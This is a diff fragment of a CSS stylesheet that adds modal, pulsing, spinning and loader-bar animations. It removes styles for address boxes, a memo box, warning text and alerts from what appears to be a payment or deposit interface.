+.cyber-modal p { color: #9ca3af; font-size: 0.95rem; line-height: 1.5; margin-bottom: 20px; }
+.icon-pulse { font-size: 3rem; animation: pulse 1s infinite; }
+.icon-spin { font-size: 3rem; animation: spin 2s infinite linear; }
+@keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+@keyframes spin { 100% { transform: rotate(360deg); } }
 
-.address-group { text-align: left; margin-bottom: 16px; }
-.address-group label { display: block; margin-bottom: 6px; color: #94a3b8; font-size: 0.85rem; }
-.address-box { background: #0b0c10; padding: 14px; border-radius: 10px; border: 1px dashed #4b5563; word-break: break-all; cursor: pointer; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
-.address-box:hover { border-color: #ff4d00; }
-.memo-box { border-color: #ff4d00; background: rgba(255, 77, 0, 0.05); }
-
-.addr-text { font-family: monospace; font-size: 0.9rem; color: #cbd5e1; }
-.instruction-box { background: #14161b; padding: 12px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #2a2f3a; }
-.warning-text { font-size: 0.85rem; color: #cbd5e1; margin-bottom: 8px; line-height: 1.4; }
-.network-badge { font-size: 0.8rem; color: #ff4d00; }
-
-/* Anim */
-.fade-in { animation: fadeIn 0.3s ease-out; }
-@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-.alert { padding: 12px; border-radius: 8px; font-size: 0.9rem; margin-bottom: 10px; }
-.alert.error { color: #ef4444; background: rgba(239, 68, 68, 0.1); }
-.alert.success { color: #22c55e; background: rgba(34, 197, 94, 0.1); }
+.loader-line { height: 4px; width: 100%; background: #2a2f3a; border-radius: 2px; overflow: hidden; position: relative; }
+.loader-line::after { 
+    content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 30%; 
+    background: #ff4d00; animation: load 1.5s infinite ease-in-out; 
+}
+.loader-line.green::after { background: #10b981; }
+@keyframes load { 0% { left: -30%; } 100% { left: 100%; } }
 </style>
